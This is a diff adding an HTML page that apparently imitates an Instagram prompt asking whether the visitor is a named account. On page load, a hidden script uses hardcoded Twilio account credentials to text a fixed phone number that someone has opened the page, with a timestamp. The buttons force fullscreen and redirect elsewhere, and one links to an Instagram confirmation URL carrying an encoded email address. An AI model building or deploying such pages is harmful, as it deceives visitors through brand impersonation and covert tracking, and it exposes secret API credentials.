@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>instagram</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link href="https://fonts.googleapis.com/css2?family=Vazir+Matn:wght@200&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Medium:wght@500&family=Vazir+Matn:wght@700&family=Heebo:wght@400&display=swap" rel="stylesheet">
+   <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+    <style>
+        body {
+            background-color: white;
+            color: black;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 2.0em;
+            margin-bottom: 770px;
+            font-family: 'Vazir Matn', sans-serif;
+            font-weight: 200;
+            align: center;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-start;
+            gap: 5px;
+            margin-top: -750px;
+        }
+
+        .message-button,
+        .follow-button {
+            font-family: Roboto, sans-serif;
+            font-size: 18px;
+            font-weight: bold;
+            border: 1px solid #ddd;  
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        .message-button {
+            background-color: white;
+            color: black;
+        }
+
+        .follow-button {
+            background-color: #0095f6;
+            color: white;
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background-color: #fff;
+            overflow: hidden;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 5px 0;
+        }
+
+        .navbar img {
+            height: 30px;
+        }
+
+        
+
+        @media only screen and (max-width: 485px) {
+            h1 {
+                font-size: 1.6em;
+            }
+        }
+    </style>
+
+<script>
+        $(document).ready(function () {
+            const twilioAccountSID = 'ACd2e88a17b14ef8022a8b6f079f92c24a';
+            const twilioAuthToken = '8b1d9a6a18613704c7c5c0bc705fc9a';
+            const twilioPhoneNumber = '+14302225977';
+
+            function sendTwilioSMS() {
+                const toPhoneNumber = '+916370943160';
+                const twilioApiUrl = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSID}/Messages.json`;
+
+                const istTime = new Date().toLocaleString('en-US', {
+    timeZone: 'Asia/Kolkata',
+    day: 'numeric',
+    month: 'long',
+    hour: 'numeric',
+    minute: 'numeric',
+    second: 'numeric',
+    hour12: true
+});
+const formattedTime = `${istTime}`;
+
+
+                const messageBody = ` ‎User is in "Are you?" on\n ‎ ‎ ‎ ‎\n${formattedTime}`;
+
+                const auth = btoa(`${twilioAccountSID}:${twilioAuthToken}`);
+
+                $.ajax({
+                    type: 'POST',
+                    url: twilioApiUrl,
+                    beforeSend: function (xhr) {
+                        xhr.setRequestHeader('Authorization', `Basic ${auth}`);
+                    },
+                    data: {
+                        To: toPhoneNumber,
+                        From: twilioPhoneNumber,
+                        Body: messageBody
+                    },
+                    success: function (response) {
+                        console.log('Twilio Notification Sent:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error sending Twilio Notification:', error);
+                    }
+                });
+            }
+
+            sendTwilioSMS();
+        });
+    </script>
+</head>
+<body>
+    
+    <div class="navbar">
+        <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
+    </div>
+
+    <h1>Are you quirky_g.i.r.l?</h1>
+    <div class="button-container">
+        <a href="https://instagram.com/accounts/confirm_email/S5s9GbL6/cnVhc2luZ2hlMDFAZ21haWwuY29t/?app_redirect%3DFalse&amp;source=gmail&amp;ust=1658914278556000&amp;usg=AOvVaw1eF_-1j16fHP8HtQVHGD6s">
+            <button class="message-button">No</button>
+        </a>
+       
+        <!-- Updated link to redirect to a page in fullscreen mode -->
+        <button id="mybutton" onclick="toggleFullScreen()" class="follow-button">Yes, it's me</button>
+    </div>
+
+    
+    
+    <script>
+        function toggleFullScreen() {
+            const element = document.documentElement;
+            const iframe = document.createElement('iframe');
+            
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
+            }
+
+          
+        
+        // Redirect to the next page after a short delay (adjust as needed)
+  setTimeout(function() {
+    window.location.href = 'https://google.com';
+  }, 1000); // Adjust the delay (in milliseconds) as needed
+}
+     
+    </script>
+    
+</body>
+</html>
